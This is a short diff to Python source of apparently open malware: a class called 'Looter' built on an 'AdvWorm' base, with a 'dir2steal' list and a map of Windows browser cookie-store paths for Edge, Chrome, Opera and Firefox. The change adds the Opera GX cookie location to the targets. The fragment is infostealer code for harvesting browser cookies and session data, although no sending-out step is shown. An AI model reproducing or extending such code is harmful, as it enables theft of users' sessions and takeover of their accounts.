@@ -11,7 +11,7 @@ class Looter(AdvWorm):
         self.dir2steal = []
         self.IG = IndexGen()
         self.cookiesLoc = {"MS_edge": "\\Microsoft\\Edge\\User Data\\Default\\Network", "Chrome": "\\Google\\Chrome\\User Data\\Default\\Network",
-        "Opera": "\\Opera Software\\Opera Stable\\Network", "FireFox": "\\Mozilla\\Firefox\\Profiles"}
+        "Opera": "\\Opera Software\\Opera Stable\\Network", "FireFox": "\\Mozilla\\Firefox\\Profiles", "Opera_GX": "\\Opera Software\\Opera GX Stable\\Network"}
 
     
     def getWinDir(self) -> None:
